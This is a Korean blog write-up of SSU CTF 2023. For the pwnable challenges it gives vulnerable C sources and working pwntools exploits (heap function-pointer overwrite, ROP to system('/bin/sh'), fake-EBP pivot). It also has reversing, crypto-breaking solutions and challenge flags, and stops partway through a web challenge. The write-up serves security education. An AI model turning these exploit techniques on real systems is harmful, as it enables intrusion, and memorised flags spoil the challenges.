---
layout: post
title:  "SSU CTF"
date:   2023-01-31
---
- 대회 기간 : 2023년 1월 28일 10:00 ~ 22:00 (12시간)
- 문제 배점 : 각 문제당 1000점

|  | Pwnable | Reversing | Crypto | Web | Misc | 총합 |
| --- | --- | --- | --- | --- | --- | --- |
| 문제 개수 | 4 | 3 | 4 | 4 | 5 | 20 |

# Pwnable(시스템해킹)

## ****Stack OoOverflow(EASY) - 10 Solves****

```
Stack이 뭘까요? 메모리 구조 Stack을 알아봅시다!

nc ssuctf.kr 10000
```

.c파일과 ELF Linux 실행파일이 주어집니다.

소스코드를 오디팅 해보면 Person 구조체를 이용해서 main함수에 초기화 해줍니다. 구조체를 확인해보면 char형 0x80만큼 선언 돼 있고, unsigned int age가 있스빈다. 다만 main함수에서 p.name을 입력받을 때 scanf(”%s, p.name); 으로 입력 길이에 대한 제한이 없어서 Buffer Overlfow 취약점이 발생할 수 있습니다.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef struct{
    char name[0x80];
    unsigned int age;
}Person;

void check(Person *);

int main(){
    Person p;

    // stdint, stdout buffer initialization
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    
    // initialize
    memset(p.name, 0, sizeof(p.name));
    p.age = 0;

    // Input Name
    printf("Name >> ");
    scanf("%s", p.name);

    check(&p);
}

void check(Person *p){
    printf("=== Profile ===\n");
    printf("Name : %s\n", p->name);
    printf("Age : %u\n", p->age);
    if(p->age){
        system("/bin/sh");
    }
}
```

check함수를 확인해보면 p→age가 true면 `system("/bin/sh");` 로 쉘을 실행해 원하는 명령어들을 실행할 수 있습니다. 그러므로 아무 값이나 많이 입력해 p→age를 덮으면 flag를 획득할 수 있습니다.

![스크린샷 2023-01-30 오전 12.33.02.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_12.33.02.png)

flag : `flag{o0o0o0000Overf10w!}`

## ****Heap OoOverflow(EASY) - 4 Solves****

```
메모리 구조에서 heap 영역은 동적할당하면 메모리가 적재되는 공간이라는 소문이..

nc ssuctf.kr 10001
```

.c파일과 ELF파일이 주어집니다. 소스코드를 분석해보면 name을 먼저할당하고 Person 구조체를 할당합니다. 그리고 Person 구조체의 name영역에 처음 힙에 할당했던 malloc(0x10)의 주소를 넣어주고, print 함수 포인터를 void print를 가르키게 합니다.  다만 `read(0, name, 0x100);` 에 의해 heap overflow가 발생할 수 있습니다.

```c
#include <stdio.h>
#include <unistd.h>
#include <malloc.h>
#include <stdlib.h>
#include <string.h>

typedef struct person{
    char *name;
    unsigned int age;
    void (*print)(struct person *);
}Person;

void print(struct person *p);
void shell();

int main(int argc, char *argv[]){
    Person *p;
    char *name;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    name = (char *)malloc(0x10);
    p = (Person *)malloc(sizeof(Person));
    p->name = name;
    p->print = print;

    printf("Name >> ");
    read(0, name, 0x100);
    printf("Age >> ");
    scanf("%u", &p->age);
    p->print(p);

    free(p);
}

void print(struct person *p){
    printf("=== INFORMATION ===\n");
    printf("Name : %s", p->name);
    printf("Age : %u\n", p->age);
}

void shell(){
    puts("It's a gift for you!");
    system("/bin/sh");
}
```

이 그림에서 0x1e13290은 name chunk이고, 0x1e132b0은 Person 구조체를 할당한 chunk입니다. 0x1e132c0은 name을 가르키고 있고 0x1e132d0은 print함수를 가르키고 있음을 알 수 있습니다.

![스크린샷 2023-01-30 오전 1.06.47.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_1.06.47.png)

`read(0, name, 0x100);` 에 의해 뒤에 힙 영역을 덮어버릴 수 있는 취약점이 발생합니다. 그래서 p→print인 함수포인터를 덮을 수 있고, 이 영역을 shell주소로 덮어버리면 p→print(p)가 실행될 때 shell함수가 호출됩니다.

![스크린샷 2023-01-30 오전 1.08.17.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_1.08.17.png)

함수포인터가 호출될 때 call rax를 합니다. 원래라면 call rax할 때 rax에는 print주소가 담겨 있어야하지만, heap overflow로 print 주소 대신 shell를 넣어서 rax에는 shell주소가 담겨있고, call rax를 통해 shell함수로 jump해 쉘을 획득할 수 있습니다.

![스크린샷 2023-01-30 오전 1.12.53.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_1.12.53.png)

풀이 코드

```python
from pwn import * # pip install pwntools

#p = process('./heapoverflow')
p = remote('ssuctf.kr',10001)

payload = b'A'*48 + p64(0x00000000004012d0)
p.sendafter(b'Name >> ', payload)
p.sendlineafter(b'Age >> ', b'777')

p.interactive()
```

실행 결과

![스크린샷 2023-01-30 오전 1.14.24.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-30_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%258C%25E1%2585%25A5%25E1%2586%25AB_1.14.24.png)

flag : `flag{ooooOoooo0000o0ooOOO0O0O0O0overf0w!!}`

## ****ggon-dae(MEDIUM) - 0 Solves****

```
대학생활은 인사를 잘해야죠.

nc ssuctf.kr 1337
```

학번이 음수일때를 검사하지 않아서, buffer의 크기를 넘겨 read 입력을 받을 수 있기 때문에 Buffer overflow 취약점이 존재합니다. 나머지는 ROP(Return Oriented Programming)를 이용해서 exploit 하면 된다.

풀이 코드

```python
from pwn import * # pip install pwntools

p = remote("ssuctf.kr", 1337)
e = ELF("main")

pay = b''
pay += b"A" * 120
pay += p64(e.plt['puts'])
pay += p64(e.sym['main'])

p.recv()
p.sendline("-1")

p.recv()
p.send(pay)

leak = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b'\x00')) - 0x620d0
log.info(hex(leak))

pay = b''
pay += b"A" * 120
pay += p64(0x004012c4)
pay += p64(leak + 0x001bc021) # prdi
pay += p64(leak + 0x1d8698) # /bin/sh
pay += p64(leak + 0x50d60) # system

p.recv()
p.sendline("-1")

p.recv()
p.send(pay)

p.recv()
p.interactive()
```

실행 결과

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled.png)

flag : `flag{Base_of_Pwnable_in_2023}`

## ****Fake EBP(Hard) - 0 Solves****

```
Only 1 Byte Overflow

Reference : https://dokhakdubini.tistory.com/254

nc ssuctf.kr 1467

Hint : 취약한 함수에서 스택프레임 rbp의 하위 1바이트를 어떤 값으로 덮어보세요.
```

취약점은 fgets함수에서 overflow로 인해서 vuln_function스택프레임의 rbp까지 조작 가능합니다.

```c
//gcc -o fake_ebp -z relro -no-pie -mpreferred-stack-boundary=4 -fno-stack-protector fake_rbp.c 
#include <stdio.h>
#include <stdlib.h>

void ignore_me_init_buffering() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void vuln_function()
{
    char arr[0x40];
    printf("This function surely vuln\n\n");
    printf("Enter the vuln input : ");
    fgets(arr,0x48,stdin);

}

int main(int argc, char *argv[])
{
    ignore_me_init_buffering();
    printf("main function call vuln_function\n\n");
    vuln_function();
    return 0;
}
```

1. rbp 레지스터 --> 이전 함수의 rsp레지스터 복귀주소를 가리킨다.
2. fgets --> 입력받은 문자열(개행 포함)의 맨 끝에 "\x00"이 추가된다.
3. rbp 레지스터를 원하는 값으로 바꿀 수 있을 때 원하는 주소로 rsp를 옮길 수 있다. ( stack pivoting or fake_ebp라고 부름릅니다.)

reference : [https://dokhakdubini.tistory.com/254](https://dokhakdubini.tistory.com/254)

1. vuln_funtion의 rbp를 payload위치로 설정했을 때 레지스터들의 변화는 아래와 같다.
    
    ![ezgif.com-gif-maker.gif](img%20e0061c49e68b4dbc8047ca5b2c52fabc/ezgif.com-gif-maker.gif)
    

풀이 방법

fgets함수에서 overflow로 rbp의 하위 1바이트를 0x00으로 바꿉니다.

→ leave; 명령어 실행 시 main함수 스택프레임의 base 대신 페이로드 위치를 main함수 스택프레임의 base위치라고 착각합니다.
→ rbp하위 1바이트를 0x00으로 바꾸었을 때 payload를 가리킬 확률이 약 1/16정도 됩니다.

rbp가 페이로드 위치를 가리킬 때 디버깅

![Screenshot from 2023-01-31 12-21-21.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Screenshot_from_2023-01-31_12-21-21.png)

rbp가 페이로드 위치를 가리킬 때 디버깅

![Screenshot from 2023-01-31 12-21-56.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Screenshot_from_2023-01-31_12-21-56.png)

풀이 코드

```python
from pwn import *

#context.log_level='debug'
#context.log_level='critical'
e= ELF("./fake_ebp")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

puts = e.plt['puts']
puts_got = e.got['puts']
ret = 0x0000000000401278
pop_rdi = 0x00000000004012e3
_start = e.sym['_start']

while True:
    try:
        p= process("./fake_ebp")
        p.recvuntil("input : ")

        ## leak stage ##

        #payload = flat([ret, ret, ret, pop_rdi, puts_got, puts, _start])
        payload = p64(ret)*3 + p64(pop_rdi) + p64(puts_got) + p64(puts) + p64(_start)
        payload = payload.ljust((0x40-1),b"A")
        p.sendline(payload)

        leak=p.recvuntil(b"\x7f",timeout=1).ljust(8,b'\x00')

        if b"\x7f" not in leak:
            p.close()
            continue
        log.critical(f"leak is {leak}")

        ## /bin/sh stage ##

        base = u64(leak) - libc.sym['puts']
        system=base+libc.sym['system']
        binsh=base+next(libc.search(b"/bin/sh\x00"))

        #payload2 = flat([ret, ret, ret, ret, pop_rdi, binsh, system])
        payload2 = p64(ret)*4 + p64(pop_rdi) + p64(binsh) + p64(system)
        payload2 = payload2.ljust((0x40-1),b"A")

        p.sendlineafter("input : ",payload2)

        p.sendline("id")
        p.sendline("id")
        p.sendline("id")
        p.sendline("id")
        log.critical("EXPLOIT DONE")
        p.interactive()
    except EOFError:
        p.close()
        continue
```

flag : `flag{faaaaaaaake_ebp}`

# Reversing(리버스 엔지니어링)

## Admin’s JavaScript(EASY) - 12 Solves

```
숭실대 개발자분이 비밀번호를 까먹었다네요. 해커인 우리가 비밀번호를 복구해줍시다!
```

html, js폴더, css폴더, asserts폴더가 주어집니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%201.png)

index.html을 Chrome으로 열어보면 Password 입력받는 창이 나옵니다. 아무거나 입력해보면 Wrong password :)을 출력해줍니다. 

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%202.png)

js코드에 의해서 동작하는 것을 확인할 수 있습니다. 다만 js코드가 살짝의 난독화가 적용돼 있습니다.

```python
function checkpassword(){const _0x1febba=document['getElementById']('password')['value'],_0x12f88c=[0x19,0x13,0x1e,0x18,0x4,0x3a,0x1e,0xc,0x6,0x20,0xb,0x10,0x20,0x3b,0x1a,0x10,0x3d,0x19,0xa,0xc,0x1c,0x4b,0x2b,0x1a,0x20,0x35,0x3e,0x9,0x1e,0x4a,0x1c,0xd,0x4e,0xf,0xb,0x20,0x10,0x1d,0x39,0xa,0x4a,0x1c,0x1e,0xb,0x1a,0x2];let _0x17d2a7=[];for(let _0x3f25f9=0x0;_0x3f25f9<_0x12f88c['length'];++_0x3f25f9){_0x17d2a7['push'](0x7f^_0x1febba['charCodeAt'](_0x3f25f9)['toString'](0xa));}_0x17d2a7==_0x12f88c['toString']()?(alert('Correct!'),document['getElementById']('alert')['innerHTML']='Input\x20is\x20FLAG!'):document['getElementById']('alert')['innerHTML']='Wrong\x20password\x20:)';}
```

Online JavaScript beautifier를 이용해서 알아보기 편하게 바꿔줬습니다. 확인해보면 우리가 입력한 값이 저장되는 _0x1febba를 0x7f로 xor연산을 해서 값이 _0x12f88c 인지 확인합니다. 같으면 Correct를 띄워주는 것을 확인할 수 있습니다.

```python
function checkpassword() {
    const _0x1febba = document['getElementById']('password')['value'],
        _0x12f88c = [0x19, 0x13, 0x1e, 0x18, 0x4, 0x3a, 0x1e, 0xc, 0x6, 0x20, 0xb, 0x10, 0x20, 0x3b, 0x1a, 0x10, 0x3d, 0x19, 0xa, 0xc, 0x1c, 0x4b, 0x2b, 0x1a, 0x20, 0x35, 0x3e, 0x9, 0x1e, 0x4a, 0x1c, 0xd, 0x4e, 0xf, 0xb, 0x20, 0x10, 0x1d, 0x39, 0xa, 0x4a, 0x1c, 0x1e, 0xb, 0x1a, 0x2];
    let _0x17d2a7 = [];
    for (let _0x3f25f9 = 0x0; _0x3f25f9 < _0x12f88c['length']; ++_0x3f25f9) {
        _0x17d2a7['push'](0x7f ^ _0x1febba['charCodeAt'](_0x3f25f9)['toString'](0xa));
    }
    _0x17d2a7 == _0x12f88c['toString']() ? (alert('Correct!'), document['getElementById']('alert')['innerHTML'] = 'Input\x20is\x20FLAG!') : document['getElementById']('alert')['innerHTML'] = 'Wrong\x20password\x20:)';
}
```

xor 연산의 특성을 이용해서 역연산을 해주면 됩니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%203.png)

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%204.png)

flag : `flag{Easy_to_DeoBfusc4Te_JAva5cr1pt_obFu5cate}`

## Android(EASY) - 7 Solves

```
Bad designer
```

fontSize가 0로 되어있어 실행 시 보이지 않습니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%205.png)

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%206.png)

jadx-gui로 decompile한 화면입니다. React Native로 개발된 안드로이드 앱임을 확인할 수 있습니다.

![‘jadx gui’로 decompile](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%207.png)

‘jadx gui’로 decompile

…/assets/index.android.bundle에서 해당 Text 컴포넌트를 찾을 수 있습니다.

![Untitled.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%208.png)

*shortcut 근처에 있는 “Hi!”를 search하면 (447 line) 바로 옆에 “`ZmxhZ3tIMzExb180bmRSMDFkIX0=`"가 있습니다. 

![Untitled.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%209.png)

Base64로 인코딩 돼 있음을 확인할 수 있고 Decode해주면 flag를 획득할 수 있습니다.

flag : `flag{H311o_4ndR01d!}`

## ****RRRR-(HARD) - 2 Solves****

```
RRRRRRRRR-andom
```

IDA Freeware 를 통해서 실행파일을 디컴파일 하면 아래와 같은 main함수를 발견할 수 있다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rbx
  FILE *v4; // rax
  char *v6; // rax
  char *v7; // rdi
  FILE *v8; // rax
  FILE *v9; // rax
  __int64 v10; // rsi
  const char *v11; // r14
  int v12; // ebx
  int v13; // ebx
  unsigned __int16 v14; // ax
  __int64 v15; // rbp
  __int64 v16; // rbx
  __int64 v17; // rax
  char v18; // dl
  int v19; // r9d
  __int64 v20; // rbx
  int v21; // r10d
  int v22; // r11d
  char *v23; // r8
  int v24; // r11d
  __int64 v25; // rax

  srand(0xDEADu);
  v3 = fopen("./flag.txt", "r");
  if ( !v3 )
  {
    v4 = _acrt_iob_func(2u);
    sub_140001010(v4, "fopen error!\n");
    return -1;
  }
  v6 = (char *)calloc(0xFFFFui64, 1ui64);
  v7 = v6;
  if ( !v6 )
    goto LABEL_4;
  if ( fgets(v6, 0xFFFF, v3) )
  {
    v10 = -1i64;
    do
      ++v10;
    while ( v7[v10] );
    v11 = (const char *)calloc(4 * (int)v10 / 3, 1ui64);
    if ( !v11 )
    {
LABEL_4:
      v8 = _acrt_iob_func(2u);
      sub_140001010(v8, "calloc error!\n");
      return -1;
    }
    v12 = rand();
    v13 = rand() * v12;
    v14 = v13 + rand();
    if ( v14 )
    {
      v15 = v14;
      do
      {
        v16 = rand() & 0x3F;
        v17 = rand() & 0x3F;
        v18 = aAbcdefghijklmn[v17];
        aAbcdefghijklmn[v17] = aAbcdefghijklmn[v16];
        aAbcdefghijklmn[v16] = v18;
        --v15;
      }
      while ( v15 );
    }
    v19 = 0;
    v20 = (int)v10;
    LOBYTE(v21) = 0;
    v22 = 0;
    if ( (int)v10 > 0 )
    {
      v23 = (char *)v11;
      do
      {
        if ( v22 == 3 * (v22 / 3) )
        {
          ++v19;
          *v23++ = aAbcdefghijklmn[*v7 & 0x3F];
          v21 = *v7 >> 6;
        }
        else if ( v22 % 3 == 1 )
        {
          ++v19;
          *v23++ = aAbcdefghijklmn[((unsigned __int8)v21 | (unsigned __int8)(4 * *v7)) & 0x3F];
          v21 = *v7 >> 4;
        }
        else if ( v22 % 3 == 2 )
        {
          v19 += 2;
          *v23 = aAbcdefghijklmn[((unsigned __int8)v21 | (unsigned __int8)(16 * *v7)) & 0x3F];
          v23[1] = aAbcdefghijklmn[(__int64)*v7 >> 2];
          v23 += 2;
        }
        ++v22;
        ++v7;
        --v20;
      }
      while ( v20 );
    }
    v24 = v22 % 3;
    if ( v24 > 0 )
    {
      v25 = v19++;
      v11[v25] = 61;
    }
    if ( v24 > 1 )
      v11[v19] = 61;
    puts(v11);
    return 0;
  }
  else
  {
    v9 = _acrt_iob_func(2u);
    sub_140001010(v9, "fscanf error!\n");
    return -1;
  }
}
```

함수를 요약하면 `0xDEAD` 로 `srand`하여 `rand`를 통해 구한 값을 이용해 이리저리 테이블을 섞고 base64와 유사한 연산을 통해 `flag.txt`를 인코딩 합니다.

섞인 테이블은 `srand`의 인자가 고정이기 때문에 `rand` 함수의 결과가 변하지 않아 항상 고정입니다. 아래 사진과 같이 동적디버깅을 통해서 구할 수 있습니다.

![스크린샷 2023-01-31 오후 1.08.28.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/%25E1%2584%2589%25E1%2585%25B3%25E1%2584%258F%25E1%2585%25B3%25E1%2584%2585%25E1%2585%25B5%25E1%2586%25AB%25E1%2584%2589%25E1%2585%25A3%25E1%2586%25BA_2023-01-31_%25E1%2584%258B%25E1%2585%25A9%25E1%2584%2592%25E1%2585%25AE_1.08.28.png)

구한 테이블을 이용해 해당 연산에 대한 역연산을 작성하여 플래그를 복구할 수 있습니다.

```python
TABLE = 'g3lCObp1GqEkoyIh7wdiSXPaUTYm+nzf4R8Vj5WDM6x0trNsu/vcQHFZKBL9e2AJ'
enc = 'W/PUDr1y5RcyK+ioQ7WTjqWUZGpyjwpy/7PUjTcoFopouUPTKoWTFopT8XCo23'

t = []
a = 0
i = 0 
idx = 0
while idx < len(enc):
    match i % 3:
        case 0:
            a = TABLE.index(enc[idx])
            idx += 1
        case 1:
            x = TABLE.index(enc[idx])
            idx += 1
            t.append((a | (x << 6)) & 0xFF)
            a = x >> 2
        case 2:
            x = TABLE.index(enc[idx])
            idx += 1
            t.append((a | (x << 4))  & 0xFF)
            a = x >> 4
            x = TABLE.index(enc[idx])
            idx += 1
            t.append((a | (x << 2)) & 0xFF)
    i += 1

print(bytes(t).decode())
```

flag : `flag{4e878714dfdbb7b4dd41dad636c00fe8cf6cdb50}`

# Crypto(암호학)

## ****ASCree(EASY) - 13 Solves****

```
512비트 키를 사용하는 ASCree암호를 만들어 봤어요. 이정도 키크기면 절대 안 뚫리겠죠??
```

문제제목은 caeser의 [애너그램](https://ko.wikipedia.org/wiki/%EC%96%B4%EA%B5%AC%EC%A0%84%EC%B2%A0) 입니다. 암호도 ROT입니다.

```
def encrypt(pt:str,key:str):
    ct=""
    ks=sum(map(ord,key))
    for i in pt:
        if i in string.ascii_uppercase:
            ct+=chr((ord(i)-65+ks)%26+65)
        else:
            ct+=i
    return ct

```

암호화 함수를 보면 26개의 알파벳 중에서만 값이 변경되는걸 볼수 있습니다. 따라서 key가 얼마나 크던 결국 경우의 수는 25개 밖에 존재하지 않습니다. 25번을 전부 순회하면 시작이 FLAG인 정답을 얻을수있고, 이외에도 FLAG가 시작부임을 이용해서 ks를 알아내는 방법도 있습니다.
모범 답안 코드입니다.

```
flag = open("output.txt",encoding="utf-16-le").read()[1:]
ks=(-((ord(flag[0])-65)-(ord('F')-65)))%26
print(''.join(
    chr(((x-65+ks)%26)+65 if 64<x<91 else x) for x in map(ord,flag)
))

```

Flag는 `FLAG{8BIT_SECURITY_SHOULD_NOT_EVEN_COUNT_AS_SECURE}` 입니다.

> 여담이지만 ROT는 실질적으로 key space 가 26개니까 약 4.7bit 보안이라 볼 수 있습니다.
> 

> Tip : 이런 간단한 암호 문제를 풀때 CyberChef 같은 도구를 이용하면 빠르게 풀수 있습니다.
> 

## ****“X”*255+“OR”(EASY) - 0 Solves****

```
이번엔 정말로 안전한 XOR 암호를 개발했어요 OTP를 사용한다면 절대 안 뚫리겠죠??

nc ssuctf.kr 7777

Hint : f: X -> Y
```

`key_gen` 함수를 살펴보면 아래와 같습니다.

```python
def key_gen(random :bytes) -> bytes:
    key = list(random)
    for i in range(len(key)):
        now = key[i] * 255 // 256
        key[i] = now

    return bytes(key)
```

각각의 key가 생성되는 과정에서 255라는 숫자가 절대 나올 수 없기 때문에 치역의 크기가 255로 줄어든다.

따라서 각각의 인덱스에 서로다른 255개의 출력이 나올 때 까지 계속 암호문을 받고 끝내 나오지 않은 값에 255를 xor하여 플래그를 구할 수 있습니다.

```python
# pip install pwntools
from pwn import *

# p = process(['python3','-u','./server/chall.py'])
p = remote("ssuctf.kr", 7777)

my_key = 255

p.sendlineafter(b'>>> ','2')
p.recvuntil(b': ')
flag_len = len(p.recvline())//2

flag_set = [list(range(256)) for _ in range(flag_len)]
flag = [' ' for _ in range(flag_len)]

count = 0
while sum([len(i) for i in flag_set]) > flag_len:
    p.sendlineafter(b'>>> ','2')
    p.recvuntil(b': ')
    enc = bytes.fromhex(p.recvline().strip().decode())
    
    for i in range(flag_len):
        if flag_set[i].count(enc[i]) == 1:
            flag_set[i].pop(flag_set[i].index(enc[i]))
        if len(flag_set[i]) == 1:
            flag[i] = chr(flag_set[i][-1] ^ my_key)
    print(''.join(flag))
    print(' '.join([str(len(i)) for i in flag_set]))
    count += 1

print(count)
print(''.join(flag))
```

flag : `flag{ez_xXXxxXXXxXXxxxxXxXXxXXxxxXXxxXXxOR_cHaLleNGe_1s_It?}`

## ****PolyRSA(MEDIUM) - 0 Solves****

```
두 인접한 소수를 RSA의 p,q로 쓰는것은 보안 문제가 있다고 들었어요.

적당한 거리의 두 소수를 만드는 알고리즘을 쓰면 별다른 문제가 없겠죠?

Hint : poly와 ipoly 함수는 단조 증가해요!
Hint : 단조증가수열은 정렬된 수열이겠죠?
```

간단한 형태의 textbook RSA 입니다.
그런데 이제 p와 q값이 어떠한 관계식을 갖고 있습니다. 하나하나 살펴보고 유용한 성질을 얻어 봅시다.
$p$ 는 무작위 소수 입니다. 대략 $$2^{1024}$$ 정도의 크기를 갖습니다.
$q$ 는 임의의 함수 `ipoly`, `poly`, `next_prime` 을 통과한 결과 값이 됩니다. 이때 $p$의 범위는 $2^{1025}$ 미만이고 확률적으로 $2^{1024}$ 초과라고 생각할 수 있습니다.
$N$ 는 $pq$입니다. $p\cdot\mathrm{next\_prime}(\mathrm{poly}(\mathrm{ipoly}(p)))$라고 쓸수도 있습니다.

$N$의 식이 1개의 변수로 표현되고 다른 함수의 계산이 크게 복잡도가 높지 않기 때문에 $N$의 소인수 분해 문제는 더 쉬운 변수 $p$의 최적화 문제로 변형되었습니다. 즉, $N-p\cdot\mathrm{next\_prime}(\mathrm{poly}(\mathrm{ipoly}(p)))$ 가 0이 되도록 만들면 됩니다. 그렇지만 바로 $p$를 계산 하는건 여전히 난해 하기 때문에 함수들의 성질을 조금 더 살펴 보겠습니다.

`ipoly` 함수는 조금 복잡하지만 `poly` 함수의 역함수의 근사함수입니다. 이 성질을 관측하기는 정말 어려운 일이므로 그 해석을 배제 하고 보겠습니다.
`sip`함수는 w 모양의 4차 함수입니다. 미분을 하면 `x`가 양수인 극소값이 대략 `92400489` 근처에 위치하므로 그 이상는 강한 증가함수입니다.
`num`과 `dem` 변수들 이차식을 밑으로 하는 지수식이라 $p$가 `x`로 오는 범위에서는 증가함수입니다.
즉, `ipoly` 함수는 p$의 범위에서 증가함수 입니다. 미분도 가능합니다.
`poly`함수는 삼차함수의 제곱근입니다. 삼차 함수의 계수를 보면 $p$의 범위에서는 증가함수임을 알수있습니다. 미분도 가능합니다.
`next_prime` 함수는 x보다 큰 다음 소수를 출력하는 함수입니다. 정의에 의해서 증가함수가 됩니다. 다만 치역이 자연수 집합이라 미분이 어렵습니다.

미분이 어려우니 다른 최적화 알고리즘은 어려울듯 하지만 증가함수들만 있다면 이것을 수열로 생각해 볼수 있습니다. $p$값에 대한 $N$의 수열을 생각해보면 이것은 증가 수열 입니다. 다른 말로는 오름차순 정렬 되어있는 수열이죠. 그렇다면 이분 탐색을 활용 할수 있습니다. PS에서는 보통 Paremetric search 라고 하는 테크닉입니다. 따라서 p 값을 변형하면서 N을 이분 탐색하면 최대 1024번 의 iteration 안에 N을 찾을수 있습니다.

다음은 풀이 코드입니다.

```
from math import isqrt
from decimal import Decimal,getcontext
from gmpy2 import next_prime
from prob import ipoly,poly
def next_prime2(x):
    return int(next_prime(x))

N = ...#
e = 65537
c = ...#
high=isqrt(N)
low=2
it=1
while low<high:
    mid=(high+low)//2
    p=next_prime2(mid)
    q=next_prime2(poly(ipoly(Decimal(p))+2**640))
    if N%p==0:
        high=low=p
        break
    elif p*q>N:
        high=mid-1
    else:
        low=mid+1
    print("\\riter ",it,end='')
    it+=1

print(N%high == 0 or N%low == 0 )
print(high if N%high == 0 else low)
p,q=high,N//p
d=pow(e,-1,(p-1)*(q-1))
print((pow(c,d,N)).to_bytes(2048//8,'big'))

```

Flag는 `flag{having_relation_between_prime_make_order_base_cryptosystem_vulnerable}`입니다.

> Tip : 대부분의 RSA 변형 문제는 N의 크기가 512bit 정도가 아닌 이상 직접적인 소인수 분해를 요구하지 않습니다. p와 q의 관계나 다른 방식으로 m을 유도해낼 방법을 생각해 보세요!
> 

# Web(웹해킹)

## ****Qrcode Image(EASY) - 12 Solves****

```
소심하고 대책없는 관리자의 정보를 찾아서...

http://ssuctf.kr:8899/
```

/ 경로에서 이름, 이메일, 전화번호를 입력하면 qrcode 생성하면 static 디렉터리에 저장한다. QRCODE가 저장된 파일명은 입력한 이름으로 저장됩니다. (이름을 입력하지 않을 경우 `.png` 라는 이름으로 저장) 저장을 원하지 않는다면 삭제 가능하다.

/list에서는 User의 List들을 확인할 수 있다.

![Untitled.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2010.png)

/user/<username>

admin을 클릭하면 아래와 같이 qrcode가 뜨지 않는다.

![Untitled.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2011.png)

유저는 아래와 같이 qrcode 이미지가 보인다.

![Untitled.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2012.png)

이미지 주소를 복사하면 `[http://HOST:PORT/static/<username>.png](http://localhost:10002/static/<username>.png)` 으로 뜸을 확인할 수 있다. admin의 qrcode는 `/static/admin.png` 임을 알 수 있다. 해당 경로로 접근해서 qrcode를 스캔하면 숨겨진 경로를 알 수 있다. Admin의 경로는 /Adm1n_MB7i로 접근할 수 있고 Admin의 MBTI를 맞추면 된다.

![Untitled.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2013.png)

flag : `flag{Bru7E_F0rc3_9o0d}`

## ****웹프_최최종_final_시험(MEDIUM) - 6 Solves****

```
쇼핑몰에서 어떤걸 사야할지 모르겠어요..

http://ssuctf.kr:13001/welcome.jsp
```

처음 웹 사이트에 접속하면 welcome 페이지, 상품 목록, 상품 등록, 상품 수정 탭이 보입니다.

![Untitled.png](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2014.png)

상품 목록 페이지에서는 상품 목록이 보이고, 각 제품의 스펙 버튼을 누르면 엑셀 파일을 다운받을 수 있습니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2015.png)

상품 등록 페이지에 접속하면 관리자만 접속할 수 있다는 메세지가 보입니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2016.png)

웹사이트에 파일 다운로드 외 별다른 기능이 없으므로, 파일 다운로드 부분을 보겠습니다. 제품스펙 버튼을 클릭할때 onclick속성으로 btnFunc()함수를 실행하는 것을 알 수 있습니다.

![Untitled](img%20e0061c49e68b4dbc8047ca5b2c52fabc/Untitled%2017.png)

